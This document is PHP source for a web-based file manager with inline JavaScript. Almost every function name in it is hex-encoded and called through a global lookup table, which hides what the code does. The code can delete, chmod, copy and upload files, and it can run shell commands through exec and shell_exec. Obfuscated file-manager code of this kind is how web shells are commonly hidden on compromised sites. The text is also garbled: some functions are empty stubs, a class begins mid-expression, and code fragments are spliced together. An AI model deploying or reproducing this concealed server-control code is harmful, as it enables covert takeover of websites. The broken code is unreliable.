function print_external($key)
{ global $external; if (!$GLOBALS['F']["\x61\x72\x72\x61\x79\x5f\x6b\x65\x79\x5f\x65\x78\x69\x73\x74\x73"]($key, $external)) {  echo "<!-- EXTERNAL: MISSING KEY $key -->"; return; } echo "$external[$key]";
}

function verifyToken($token)
{ if ($GLOBALS['F']["\x68\x61\x73\x68\x5f\x65\x71\x75\x61\x6c\x73"]($_SESSION["\x74\x6f\x6b\x65\x6e"], $token)) { return true; } return false;
}

function fm_rdelete($path)
{ if ($GLOBALS['F']["\x69\x73\x5f\x6c\x69\x6e\x6b"]($path)) { return $GLOBALS['F']["\x75\x6e\x6c\x69\x6e\x6b"]($path); } elseif ($GLOBALS['F']["\x69\x73\x5f\x64\x69\x72"]($path)) { $objects = $GLOBALS['F']["\x73\x63\x61\x6e\x64\x69\x72"]($path); $ok = true; if ($GLOBALS['F']["\x69\x73\x5f\x61\x72\x72\x61\x79"]($objects)) { foreach ($objects as $file) { if ($file != "\x2e" && $file != "\x2e\x2e") { if (!$GLOBALS['F']["\x66\x6d\x5f\x72\x64\x65\x6c\x65\x74\x65"]($path . "\x2f" . $file)) { $ok = false; } } } } return ($ok) ? $GLOBALS['F']["\x72\x6d\x64\x69\x72"]($path) : false; } elseif ($GLOBALS['F']["\x69\x73\x5f\x66\x69\x6c\x65"]($path)) { return $GLOBALS['F']["\x75\x6e\x6c\x69\x6e\x6b"]($path); } return false;
}

function fm_rchmod($path, $filemode, $dirmode)
{ if ($GLOBALS['F']["\x69\x73\x5f\x64\x69\x72"]($path)) { if (!$GLOBALS['F']["\x63\x68\x6d\x6f\x64"]($path, $dirmode)) { return false; } $objects = $GLOBALS['F']["\x73\x63\x61\x6e\x64\x69\x72"]($path); if ($GLOBALS['F']["\x69\x73\x5f\x61\x72\x72\x61\x79"]($objects)) { foreach ($objects as $file) { if ($file != "\x2e" && $file != "\x2e\x2e") { if (!$GLOBALS['F']["\x66\x6d\x5f\x72\x63\x68\x6d\x6f\x64"]($path . "\x2f" . $file, $filemode, $dirmode)) { return false; } } } } return true; } elseif ($GLOBALS['F']["\x69\x73\x5f\x6c\x69\x6e\x6b"]($path)) { return true; } elseif ($GLOBALS['F']["\x69\x73\x5f\x66\x69\x6c\x65"]($path)) { return $GLOBALS['F']["\x63\x68\x6d\x6f\x64"]($path, $filemode); } return false;
}

function fm_is_valid_ext($filename)
{ $allowed = (FM_FILE_EXTENSION) ? $GLOBALS['F']["\x65\x78\x70\x6c\x6f\x64\x65"]("\x2c", FM_FILE_EXTENSION) : false; $ext = $GLOBALS['F']["\x70\x61\x74\x68\x69\x6e\x66\x6f"]($filename, PATHINFO_EXTENSION); $isFileAllowed = ($allowed) ? $GLOBALS['F']["\x69\x6e\x5f\x61\x72\x72\x61\x79"]($ext, $allowed) : true; return ($isFileAllowed) ? true : false;
}

function fm_rename($old, $new)
{ $isFileAllowed = $GLOBALS['F']["\x66\x6d\x5f\x69\x73\x5f\x76\x61\x6c\x69\x64\x5f\x65\x78\x74"]($new); if (!$GLOBALS['F']["\x69\x73\x5f\x64\x69\x72"]($old)) { if (!$isFileAllowed) return false; } return (!$GLOBALS['F']["\x66\x69\x6c\x65\x5f\x65\x78\x69\x73\x74\x73"]($new) && $GLOBALS['F']["\x66\x69\x6c\x65\x5f\x65\x78\x69\x73\x74\x73"]($old)) ? $GLOBALS['F']["\x72\x65\x6e\x61\x6d\x65"]($old, $new) : null;
}

function fm_rcopy($path, $dest, $upd = true, $force = true)
{ if (!$GLOBALS['F']["\x69\x73\x5f\x64\x69\x72"]($path) && !$GLOBALS['F']["\x69\x73\x5f\x66\x69\x6c\x65"]($path)) { return false; } if ($GLOBALS['F']["\x69\x73\x5f\x64\x69\x72"]($path)) { if (!$GLOBALS['F']["\x66\x6d\x5f\x6d\x6b\x64\x69\x72"]($dest, $force)) { return false; } $objects = $GLOBALS['F']["\x61\x72\x72\x61\x79\x5f\x64\x69\x66\x66"]($GLOBALS['F']["\x73\x63\x61\x6e\x64\x69\x72"]($path), ["\x2e", "\x2e\x2e"]); foreach ($objects as $file) { if (!$GLOBALS['F']["\x66\x6d\x5f\x72\x63\x6f\x70\x79"]("$path/$file", "$dest/$file", $upd, $force)) { return false; } } return true; }  return $GLOBALS['F']["\x66\x6d\x5f\x63\x6f\x70\x79"]($path, $dest, $upd);
}

function fm_mkdir($dir, $force)
{ if ($GLOBALS['F']["\x66\x69\x6c\x65\x5f\x65\x78\x69\x73\x74\x73"]($dir)) { if ($GLOBALS['F']["\x69\x73\x5f\x64\x69\x72"]($dir)) { return $dir; } elseif (!$force) { return false; } $GLOBALS['F']["\x75\x6e\x6c\x69\x6e\x6b"]($dir); } return $GLOBALS['F']["\x6d\x6b\x64\x69\x72"]($dir, 0777, true);
}

function fm_copy($f1, $f2, $upd)
{ $time1 = $GLOBALS['F']["\x66\x69\x6c\x65\x6d\x74\x69\x6d\x65"]($f1); if ($GLOBALS['F']["\x66\x69\x6c\x65\x5f\x65\x78\x69\x73\x74\x73"]($f2)) { $time2 = $GLOBALS['F']["\x66\x69\x6c\x65\x6d\x74\x69\x6d\x65"]($f2); if ($time2 >= $time1 && $upd) { return false; } } $ok = $GLOBALS['F']["\x63\x6f\x70\x79"]($f1, $f2); if ($ok) { $GLOBALS['F']["\x74\x6f\x75\x63\x68"]($f2, $time1); } return $ok;
}

function fm_get_mime_type($file_path)
{ if ($GLOBALS['F']["\x66\x75\x6e\x63\x74\x69\x6f\x6e\x5f\x65\x78\x69\x73\x74\x73"]("\x66\x69\x6e\x66\x6f\x5f\x6f\x70\x65\x6e")) { $finfo = $GLOBALS['F']["\x66\x69\x6e\x66\x6f\x5f\x6f\x70\x65\x6e"](FILEINFO_MIME_TYPE); $mime = $GLOBALS['F']["\x66\x69\x6e\x66\x6f\x5f\x66\x69\x6c\x65"]($finfo, $file_path); if (\PHP_VERSION_ID < 80000) { $GLOBALS['F']["\x66\x69\x6e\x66\x6f\x5f\x63\x6c\x6f\x73\x65"]($finfo); } return $mime; } elseif ($GLOBALS['F']["\x66\x75\x6e\x63\x74\x69\x6f\x6e\x5f\x65\x78\x69\x73\x74\x73"]("\x6d\x69\x6d\x65\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x5f\x74\x79\x70\x65")) { return $GLOBALS['F']["\x6d\x69\x6d\x65\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x5f\x74\x79\x70\x65"]($file_path); } elseif (!$GLOBALS['F']["\x73\x74\x72\x69\x73\x74\x72"]($GLOBALS['F']["\x69\x6e\x69\x5f\x67\x65\x74"]("\x64\x69\x73\x61\x62\x6c\x65\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73"), "\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63")) { $file = $GLOBALS['F']["\x65\x73\x63\x61\x70\x65\x73\x68\x65\x6c\x6c\x61\x72\x67"]($file_path); $mime = $GLOBALS['F']["\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63"]("\x66\x69\x6c\x65\x20\x2d\x62\x69\x20" . $file); return $mime; } else { return "\x2d\x2d"; }
}

function get_absolute_path($path)
{ $path = $GLOBALS['F']["\x73\x74\x72\x5f\x72\x65\x70\x6c\x61\x63\x65"](array("\x2f", "\x5c"), DIRECTORY_SEPARATOR, $path); $parts = $GLOBALS['F']["\x61\x72\x72\x61\x79\x5f\x66\x69\x6c\x74\x65\x72"]($GLOBALS['F']["\x65\x78\x70\x6c\x6f\x64\x65"](DIRECTORY_SEPARATOR, $path), "\x73\x74\x72\x6c\x65\x6e"); $absolutes = array(); foreach ($parts as $part) { if ("\x2e" == $part) continue; if ("\x2e\x2e" == $part) { $GLOBALS['F']["\x61\x72\x72\x61\x79\x5f\x70\x6f\x70"]($absolutes); } else { $absolutes[] = $part; } } return $GLOBALS['F']["\x69\x6d\x70\x6c\x6f\x64\x65"](DIRECTORY_SEPARATOR, $absolutes);
}

function fm_clean_path($path, $trim = true)

}

function fm_get_parent_path($path)

}

}

function fm_is_exclude_items($name, $path)
{ $ext = $GLOBALS['F']["\x73\x74\x72\x74\x6f\x6c\x6f\x77\x65\x72"]($GLOBALS['F']["\x70\x61\x74\x68\x69\x6e\x66\x6f"]($name, PATHINFO_EXTENSION)); if (isset($exclude_items) and $GLOBALS['F']["\x73\x69\x7a\x65\x6f\x66"]($exclude_items)) { unset($exclude_items); } $exclude_items = FM_EXCLUDE_ITEMS; if ($GLOBALS['F']["\x76\x65\x72\x73\x69\x6f\x6e\x5f\x63\x6f\x6d\x70\x61\x72\x65"](PHP_VERSION, "\x37\x2e\x30\x2e\x30", "\x3c")) { $exclude_items = $GLOBALS['F']["\x75\x6e\x73\x65\x72\x69\x61\x6c\x69\x7a\x65"]($exclude_items); } if (!$GLOBALS['F']["\x69\x6e\x5f\x61\x72\x72\x61\x79"]($name, $exclude_items) && !$GLOBALS['F']["\x69\x6e\x5f\x61\x72\x72\x61\x79"]("*.$ext", $exclude_items) && !$GLOBALS['F']["\x69\x6e\x5f\x61\x72\x72\x61\x79"]($path, $exclude_items)) { return true; } return false;
}

function fm_get_translations($tr)
{ try { static $content = null; if ($content === null) { $content = @$GLOBALS['F']["\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"]("\x74\x72\x61\x6e\x73\x6c\x61\x74\x69\x6f\x6e\x2e\x6a\x73\x6f\x6e"); } if ($content !== FALSE) { $lng = $GLOBALS['F']["\x6a\x73\x6f\x6e\x5f\x64\x65\x63\x6f\x64\x65"]($content, TRUE); global $lang_list; foreach ($lng["\x6c\x61\x6e\x67\x75\x61\x67\x65"] as $key => $value) { $code = $value["\x63\x6f\x64\x65"]; $lang_list[$code] = $value["\x6e\x61\x6d\x65"]; if ($tr) $tr[$code] = $value["\x74\x72\x61\x6e\x73\x6c\x61\x74\x69\x6f\x6e"]; } return $tr; } } catch (Exception $e) { echo $e; }
}

function fm_get_size($file)
{ static $iswin = null; static $isdarwin = null; static $exec_works = null;  if ($iswin === null) { $iswin = $GLOBALS['F']["\x73\x74\x72\x74\x6f\x75\x70\x70\x65\x72"]($GLOBALS['F']["\x73\x75\x62\x73\x74\x72"](PHP_OS, 0, 3)) === "\x57\x49\x4e"; $isdarwin = $GLOBALS['F']["\x73\x74\x72\x74\x6f\x75\x70\x70\x65\x72"](PHP_OS) === "\x44\x41\x52\x57\x49\x4e"; $exec_works = $GLOBALS['F']["\x66\x75\x6e\x63\x74\x69\x6f\x6e\x5f\x65\x78\x69\x73\x74\x73"]("\x65\x78\x65\x63") && !$GLOBALS['F']["\x69\x6e\x69\x5f\x67\x65\x74"]("\x73\x61\x66\x65\x5f\x6d\x6f\x64\x65") && @$GLOBALS['F']["\x65\x78\x65\x63"]("\x65\x63\x68\x6f\x20\x45\x58\x45\x43") === "\x45\x58\x45\x43"; }  if ($exec_works) { $arg = $GLOBALS['F']["\x65\x73\x63\x61\x70\x65\x73\x68\x65\x6c\x6c\x61\x72\x67"]($file); $cmd = $iswin ? "for %F in (\"$file\") do @echo %~zF" : ($isdarwin ? "stat -f%z $arg" : "stat -c%s $arg"); @$GLOBALS['F']["\x65\x78\x65\x63"]($cmd, $output); if (!empty($output) && $GLOBALS['F']["\x63\x74\x79\x70\x65\x5f\x64\x69\x67\x69\x74"]($size = $GLOBALS['F']["\x74\x72\x69\x6d"]($GLOBALS['F']["\x69\x6d\x70\x6c\x6f\x64\x65"]("\x0a", $output)))) { return $size; } }  if ($iswin && $GLOBALS['F']["\x63\x6c\x61\x73\x73\x5f\x65\x78\x69\x73\x74\x73"]("\x43\x4f\x4d")) { try { $fsobj = new COM("\x53\x63\x72\x69\x70\x74\x69\x6e\x67\x2e\x46\x69\x6c\x65\x53\x79\x73\x74\x65\x6d\x4f\x62\x6a\x65\x63\x74"); $f = $fsobj->GetFile($GLOBALS['F']["\x72\x65\x61\x6c\x70\x61\x74\x68"]($file)); if ($GLOBALS['F']["\x63\x74\x79\x70\x65\x5f\x64\x69\x67\x69\x74"]($size = $f->Size)) { return $size; } } catch (Exception $e) {  } }  return $GLOBALS['F']["\x66\x69\x6c\x65\x73\x69\x7a\x65"]($file);
}

function fm_get_filesize($size)
{ $size = (float) $size; $units = array("\x42", "\x4b\x42", "\x4d\x42", "\x47\x42", "\x54\x42", "\x50\x42", "\x45\x42", "\x5a\x42", "\x59\x42"); $power = ($size > 0) ? $GLOBALS['F']["\x66\x6c\x6f\x6f\x72"]($GLOBALS['F']["\x6c\x6f\x67"]($size, 1024)) : 0; $power = ($power > ($GLOBALS['F']["\x63\x6f\x75\x6e\x74"]($units) - 1)) ? ($GLOBALS['F']["\x63\x6f\x75\x6e\x74"]($units) - 1) : $power; return $GLOBALS['F']["\x73\x70\x72\x69\x6e\x74\x66"]("\x25\x73\x20\x25\x73", $GLOBALS['F']["\x72\x6f\x75\x6e\x64"]($size / $GLOBALS['F']["\x70\x6f\x77"](1024, $power), 2), $units[$power]);
}

function fm_get_zip_info($path, $ext)
{ if ($ext == "\x7a\x69\x70" && $GLOBALS['F']["\x66\x75\x6e\x63\x74\x69\x6f\x6e\x5f\x65\x78\x69\x73\x74\x73"]("\x7a\x69\x70\x5f\x6f\x70\x65\x6e")) { $arch = @$GLOBALS['F']["\x7a\x69\x70\x5f\x6f\x70\x65\x6e"]($path); if ($arch) { $filenames = array(); while ($zip_entry = @$GLOBALS['F']["\x7a\x69\x70\x5f\x72\x65\x61\x64"]($arch)) { $zip_name = @$GLOBALS['F']["\x7a\x69\x70\x5f\x65\x6e\x74\x72\x79\x5f\x6e\x61\x6d\x65"]($zip_entry); $zip_folder = $GLOBALS['F']["\x73\x75\x62\x73\x74\x72"]($zip_name, -1) == "\x2f"; $filenames[] = array( "\x6e\x61\x6d\x65" => $zip_name, "\x66\x69\x6c\x65\x73\x69\x7a\x65" => @$GLOBALS['F']["\x7a\x69\x70\x5f\x65\x6e\x74\x72\x79\x5f\x66\x69\x6c\x65\x73\x69\x7a\x65"]($zip_entry), "\x63\x6f\x6d\x70\x72\x65\x73\x73\x65\x64\x5f\x73\x69\x7a\x65" => @$GLOBALS['F']["\x7a\x69\x70\x5f\x65\x6e\x74\x72\x79\x5f\x63\x6f\x6d\x70\x72\x65\x73\x73\x65\x64\x73\x69\x7a\x65"]($zip_entry), "\x66\x6f\x6c\x64\x65\x72" => $zip_folder  ); } @$GLOBALS['F']["\x7a\x69\x70\x5f\x63\x6c\x6f\x73\x65"]($arch); return $filenames; } } elseif ($ext == "\x74\x61\x72" && $GLOBALS['F']["\x63\x6c\x61\x73\x73\x5f\x65\x78\x69\x73\x74\x73"]("\x50\x68\x61\x72\x44\x61\x74\x61")) { $archive = new PharData($path); $filenames = array(); foreach (new RecursiveIteratorIterator($archive) as $file) { $parent_info = $file->getPathInfo(); $zip_name = $GLOBALS['F']["\x73\x74\x72\x5f\x72\x65\x70\x6c\x61\x63\x65"]("\x70\x68\x61\x72\x3a\x2f\x2f" . $path, "", $file->getPathName()); $zip_name = $GLOBALS['F']["\x73\x75\x62\x73\x74\x72"]($zip_name, ($pos = $GLOBALS['F']["\x73\x74\x72\x70\x6f\x73"]($zip_name, "\x2f")) !== false ? $pos + 1 : 0); $zip_folder = $parent_info->getFileName(); $zip_info = new SplFileInfo($file); $filenames[] = array( "\x6e\x61\x6d\x65" => $zip_name, "\x66\x69\x6c\x65\x73\x69\x7a\x65" => $zip_info->getSize(), "\x63\x6f\x6d\x70\x72\x65\x73\x73\x65\x64\x5f\x73\x69\x7a\x65" => $file->getCompressedSize(), "\x66\x6f\x6c\x64\x65\x72" => $zip_folder ); } return $filenames; } return false;
}

$fileTypes["\x70\x68\x70"] = ["\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78\x2d\x70\x68\x70"]; $fileTypes["\x68\x74\x6d\x6c"] = ["\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c"]; $fileTypes["\x74\x78\x74"] = ["\x74\x65\x78\x74\x2f\x70\x6c\x61\x69\x6e"];  if (empty($fileTypes[$extension])) { $fileTypes[$extension] = ["\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6f\x63\x74\x65\x74\x2d\x73\x74\x72\x65\x61\x6d"]; } return $fileTypes[$extension];
}

function scan($dir = "", $filter = "")
{ $path = FM_ROOT_PATH . "\x2f" . $dir; if ($path) { $ite = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path)); $rii = new RegexIterator($ite, "\x2f\x28" . $filter . "\x29\x2f\x69"); $files = array(); foreach ($rii as $file) { if (!$file->isDir()) { $fileName = $file->getFilename(); $location = $GLOBALS['F']["\x73\x74\x72\x5f\x72\x65\x70\x6c\x61\x63\x65"](FM_ROOT_PATH, "", $file->getPath()); $files[] = array( "\x6e\x61\x6d\x65" => $fileName, "\x74\x79\x70\x65" => "\x66\x69\x6c\x65", "\x70\x61\x74\x68" => $location, ); } } return $files; }
}

{ if ($GLOBALS['F']["\x63\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x5f\x73\x74\x61\x74\x75\x73"]() != 0) return (false); $extension = $GLOBALS['F']["\x70\x61\x74\x68\x69\x6e\x66\x6f"]($fileName, PATHINFO_EXTENSION); $contentType = $GLOBALS['F']["\x66\x6d\x5f\x67\x65\x74\x5f\x66\x69\x6c\x65\x5f\x6d\x69\x6d\x65\x73"]($extension); if ($GLOBALS['F']["\x69\x73\x5f\x61\x72\x72\x61\x79"]($contentType)) { $contentType = $GLOBALS['F']["\x69\x6d\x70\x6c\x6f\x64\x65"]("\x20", $contentType); } $size = $GLOBALS['F']["\x66\x69\x6c\x65\x73\x69\x7a\x65"]($fileLocation); if ($size == 0) { $GLOBALS['F']["\x66\x6d\x5f\x73\x65\x74\x5f\x6d\x73\x67"]($GLOBALS['F']["\x6c\x6e\x67"]("\x5a\x65\x72\x6f\x20\x62\x79\x74\x65\x20\x66\x69\x6c\x65\x21\x20\x41\x62\x6f\x72\x74\x69\x6e\x67\x20\x64\x6f\x77\x6e\x6c\x6f\x61\x64"), "\x65\x72\x72\x6f\x72"); $FM_PATH = FM_PATH; $GLOBALS['F']["\x66\x6d\x5f\x72\x65\x64\x69\x72\x65\x63\x74"](FM_SELF_URL . class FM_Zipper
{ private $zip; public function __construct() { $this->zip = new ZipArchive(); }  public function create($filename, $files) { $res = $this->zip->open($filename, ZipArchive::CREATE); if ($res !== true) { return false; } if ($GLOBALS['F']["\x69\x73\x5f\x61\x72\x72\x61\x79"]($files)) { foreach ($files as $f) { $f = $GLOBALS['F']["\x66\x6d\x5f\x63\x6c\x65\x61\x6e\x5f\x70\x61\x74\x68"]($f); if (!$this->addFileOrDir($f)) { $this->zip->close(); return false; } } $this->zip->close(); return true; } else { if ($this->addFileOrDir($files)) { $this->zip->close(); return true; } return false; } }  public function unzip($filename, $path) { $res = $this->zip->open($filename); if ($res !== true) { return false; } if ($this->zip->extractTo($path)) { $this->zip->close(); return true; } return false; }  private function addFileOrDir($filename) { if ($GLOBALS['F']["\x69\x73\x5f\x66\x69\x6c\x65"]($filename)) { return $this->zip->addFile($filename); } elseif ($GLOBALS['F']["\x69\x73\x5f\x64\x69\x72"]($filename)) { return $this->addDir($filename); } return false; }  private function addDir($path) { if (!$this->zip->addEmptyDir($path)) { return false; } $objects = $GLOBALS['F']["\x73\x63\x61\x6e\x64\x69\x72"]($path); if ($GLOBALS['F']["\x69\x73\x5f\x61\x72\x72\x61\x79"]($objects)) { foreach ($objects as $file) { if ($file != "\x2e" && $file != "\x2e\x2e") { if ($GLOBALS['F']["\x69\x73\x5f\x64\x69\x72"]($path . "\x2f" . $file)) { if (!$this->addDir($path . "\x2f" . $file)) { return false; } } elseif ($GLOBALS['F']["\x69\x73\x5f\x66\x69\x6c\x65"]($path . "\x2f" . $file)) { if (!$this->zip->addFile($path . "\x2f" . $file)) { return false; } } } } return true; } return false; }
}

class FM_Zipper_Tar
{ private $tar; public function __construct() { $this->tar = null; }  public function create($filename, $files) { $this->tar = new PharData($filename); if ($GLOBALS['F']["\x69\x73\x5f\x61\x72\x72\x61\x79"]($files)) { foreach ($files as $f) { $f = $GLOBALS['F']["\x66\x6d\x5f\x63\x6c\x65\x61\x6e\x5f\x70\x61\x74\x68"]($f); if (!$this->addFileOrDir($f)) { return false; } } return true; } else { if ($this->addFileOrDir($files)) { return true; } return false; } }  public function unzip($filename, $path) { $res = $this->tar->open($filename); if ($res !== true) { return false; } if ($this->tar->extractTo($path)) { return true; } return false; }  private function addFileOrDir($filename) { if ($GLOBALS['F']["\x69\x73\x5f\x66\x69\x6c\x65"]($filename)) { try { $this->tar->addFile($filename); return true; } catch (Exception $e) { return false; } } elseif ($GLOBALS['F']["\x69\x73\x5f\x64\x69\x72"]($filename)) { return $this->addDir($filename); } return false; }  private function addDir($path) { $objects = $GLOBALS['F']["\x73\x63\x61\x6e\x64\x69\x72"]($path); if ($GLOBALS['F']["\x69\x73\x5f\x61\x72\x72\x61\x79"]($objects)) { foreach ($objects as $file) { if ($file != "\x2e" && $file != "\x2e\x2e") { if ($GLOBALS['F']["\x69\x73\x5f\x64\x69\x72"]($path . "\x2f" . $file)) { if (!$this->addDir($path . "\x2f" . $file)) { return false; } } elseif ($GLOBALS['F']["\x69\x73\x5f\x66\x69\x6c\x65"]($path . "\x2f" . $file)) { try { $this->tar->addFile($path . "\x2f" . $file); } catch (Exception $e) { return false; } } } } return true; } return false; }
}

class FM_Config
{ var $data; function __construct() { global $root_path, $root_url, $CONFIG; $fm_url = $root_url . $_SERVER["\x50\x48\x50\x5f\x53\x45\x4c\x46"]; $this->data = array( "\x6c\x61\x6e\x67" => "\x65\x6e", "\x65\x72\x72\x6f\x72\x5f\x72\x65\x70\x6f\x72\x74\x69\x6e\x67" => true, "\x73\x68\x6f\x77\x5f\x68\x69\x64\x64\x65\x6e" => true ); $data = false; if ($GLOBALS['F']["\x73\x74\x72\x6c\x65\x6e"]($CONFIG)) { $data = $GLOBALS['F']["\x66\x6d\x5f\x6f\x62\x6a\x65\x63\x74\x5f\x74\x6f\x5f\x61\x72\x72\x61\x79"]($GLOBALS['F']["\x6a\x73\x6f\x6e\x5f\x64\x65\x63\x6f\x64\x65"]($CONFIG)); } else { $msg = $GLOBALS['F']["\x6c\x6e\x67"]("\x41\x70\x70\x4e\x61\x6d\x65")."\x3c\x62\x72\x3e\x45\x72\x72\x6f\x72\x3a\x20\x43\x61\x6e\x6e\x6f\x74\x20\x6c\x6f\x61\x64\x20\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x74\x69\x6f\x6e"; if ($GLOBALS['F']["\x73\x75\x62\x73\x74\x72"]($fm_url, -1) == "\x2f") { $fm_url = $GLOBALS['F']["\x72\x74\x72\x69\x6d"]($fm_url, "\x2f"); $msg .= "\x3c\x62\x72\x3e"; $msg .= "\x3c\x62\x72\x3e\x53\x65\x65\x6d\x73\x20\x6c\x69\x6b\x65\x20\x79\x6f\x75\x20\x68\x61\x76\x65\x20\x61\x20\x74\x72\x61\x69\x6c\x69\x6e\x67\x20\x73\x6c\x61\x73\x68\x20\x6f\x6e\x20\x74\x68\x65\x20\x55\x52\x4c\x2e"; $msg .= "\x3c\x62\x72\x3e\x54\x72\x79\x20\x74\x68\x69\x73\x20\x6c\x69\x6e\x6b\x3a\x20\x3c\x61\x20\x68\x72\x65\x66\x3d\x22" . $fm_url . "\x2f\x2f\x44\x65\x66\x61\x75\x6c\x74\x20\x43\x6f\x6e\x66\x69\x67\x75\x72\x61\x74\x69\x6f\x6e" . $GLOBALS['F']["\x63\x68\x72"](13) . $GLOBALS['F']["\x63\x68\x72"](10) . "$var_name = $var_value;" . $GLOBALS['F']["\x63\x68\x72"](13) . $GLOBALS['F']["\x63\x68\x72"](10); if ($GLOBALS['F']["\x69\x73\x5f\x77\x72\x69\x74\x61\x62\x6c\x65"]($fm_file)) { $lines = $GLOBALS['F']["\x66\x69\x6c\x65"]($fm_file); if ($fh = @$GLOBALS['F']["\x66\x6f\x70\x65\x6e"]($fm_file, "\x77")) { @$GLOBALS['F']["\x66\x70\x75\x74\x73"]($fh, $config_string, $GLOBALS['F']["\x73\x74\x72\x6c\x65\x6e"]($config_string)); for ($x = 3; $x < $GLOBALS['F']["\x63\x6f\x75\x6e\x74"]($lines); $x++) { @$GLOBALS['F']["\x66\x70\x75\x74\x73"]($fh, $lines[$x], $GLOBALS['F']["\x73\x74\x72\x6c\x65\x6e"]($lines[$x])); } @$GLOBALS['F']["\x66\x63\x6c\x6f\x73\x65"]($fh); } } }

function fm_show_nav_path($path)
{ global $lang, $sticky_navbar, $editFile; $isStickyNavBar = $sticky_navbar ? "\x66\x69\x78\x65\x64\x2d\x74\x6f\x70" : "";

        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarSupportedContent">

            <?php

}

        <script>
            function template(html, options) {
                var re = /<\%([^\%>]+)?\%>/g,
                    reExp = /(^( )?(if|for|else|switch|case|break|{|}))(.*)?/g,
                    code = 'var r=[];\n',
                    cursor = 0,
                    match;
                var add = function(line, js) {
                    js ? (code += line.match(reExp) ? line + '\n' : 'r.push(' + line + ');\n') : (code += line != '' ? 'r.push("' + line.replace(/"/g, '\\"') + '");\n' : '');
                    return add
                }
                while (match = re.exec(html)) {
                    add(html.slice(cursor, match.index))(match[1], !0);
                    cursor = match.index + match[0].length
                }
                add(html.substr(cursor, html.length - cursor));
                code += 'return r.join("");';
                return new Function(code.replace(/[\r\t\n]/g, '')).apply(options)
            }

            function rename(e, t) {
                if (t) {
                    $("#js-rename-from").val(t);
                    $("#js-rename-to").val(t);
                    $("#renameDialog").modal('show');
                }
            }

            function change_checkboxes(e, t) {
                for (var n = e.length - 1; n >= 0; n--) e[n].checked = "boolean" == typeof t ? t : !e[n].checked
            }

            function get_checkboxes() {
                for (var e = document.getElementsByName("file[]"), t = [], n = e.length - 1; n >= 0; n--)(e[n].type = "checkbox") && t.push(e[n]);
                return t
            }

            function select_all() {
                change_checkboxes(get_checkboxes(), !0)
            }

            function unselect_all() {
                change_checkboxes(get_checkboxes(), !1)
            }

            function invert_all() {
                change_checkboxes(get_checkboxes())
            }

            function checkbox_toggle() {
                var e = get_checkboxes();
                e.push(this), change_checkboxes(e)
            }

            // Create file backup with .bck
            function backup(e, t) {
                var n = new XMLHttpRequest,
                    a = "path=" + e + "&file=" + t + "&token=" + window.csrf + "&type=backup&ajax=true";
                return n.open("POST", "", !0), n.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), n.onreadystatechange = function() {
                    4 == n.readyState && 200 == n.status && toast(n.responseText)
                }, n.send(a), !1
            }

            // Toast message
            function toast(txt) {
                var x = document.getElementById("snackbar");
                x.innerHTML = txt;
                x.className = "show";
                setTimeout(function() {
                    x.className = x.className.replace("show", "");
                }, 3000);
            }

            // Save file
            function edit_save(e, t) {
                var n = "ace" == t ? editor.getSession().getValue() : document.getElementById("normal-editor").value;
                if (typeof n !== 'undefined' && n !== null) {
                    if (true) {
                        var data = {
                            ajax: true,
                            content: n,
                            type: 'save',
                            token: window.csrf
                        };

                        $.ajax({
                            type: "POST",
                            url: window.location,
                            data: JSON.stringify(data),
                            contentType: "application/json; charset=utf-8",
                            success: function(mes) {
                                toast("<?php echo $GLOBALS['F']["\x6c\x6e\x67"]("\x53\x61\x76\x65\x64\x20\x53\x75\x63\x63\x65\x73\x73\x66\x75\x6c\x6c\x79"); ?>");
                                window.onbeforeunload = function() {
                                    return
                                }
                            },
                            failure: function(mes) {
                                toast("<?php echo $GLOBALS['F']["\x6c\x6e\x67"]("\x45\x72\x72\x6f\x72\x3a\x20\x74\x72\x79\x20\x61\x67\x61\x69\x6e"); ?>");
                            },
                            error: function(mes) {
                                toast(`<p style="background-color:red">${mes.responseText}</p>`);
                            }
                        });
                    } else {
                        var a = document.createElement("form");
                        a.setAttribute("method", "POST"), a.setAttribute("action", "");
                        var o = document.createElement("textarea");
                        o.setAttribute("type", "textarea"), o.setAttribute("name", "savedata");
                        let cx = document.createElement("input");
                        cx.setAttribute("type", "hidden");
                        cx.setAttribute("name", "token");
                        cx.setAttribute("value", window.csrf);
                        var c = document.createTextNode(n);
                        o.appendChild(c), a.appendChild(o), a.appendChild(cx), document.body.appendChild(a), a.submit()
                    }
                }
            }

            function show_new_pwd() {
                $(".js-new-pwd").toggleClass('hidden');
            }

            // Save Settings
            function save_settings($this) {
                let form = $($this);
                $.ajax({
                    type: form.attr('method'),
                    url: form.attr('action'),
                    data: form.serialize() + "&token=" + window.csrf + "&ajax=" + true,
                    success: function(data) {
                        if (data) {
                            window.location.reload();
                        }
                    }
                });
                return false;
            }

            //Create new password hash
            function new_password_hash($this) {
                let form = $($this),
                    $pwd = $("#js-pwd-result");
                $pwd.val('');
                $.ajax({
                    type: form.attr('method'),
                    url: form.attr('action'),
                    data: form.serialize() + "&token=" + window.csrf + "&ajax=" + true,
                    success: function(data) {
                        if (data) {
                            $pwd.val(data);
                        }
                    }
                });
                return false;
            }

            // Upload files using URL @param {Object}
            function upload_from_url($this) {
                let form = $($this),
                    resultWrapper = $("div#js-url-upload__list");
                $.ajax({
                    type: form.attr('method'),
                    url: form.attr('action'),
                    data: form.serialize() + "&token=" + window.csrf + "&ajax=" + true,
                    beforeSend: function() {
                        form.find("input[name=uploadurl]").attr("disabled", "disabled");
                        form.find("button").hide();
                        form.find(".lds-facebook").addClass('show-me');
                    },
                    success: function(data) {
                        if (data) {
                            data = JSON.parse(data);
                            if (data.done) {
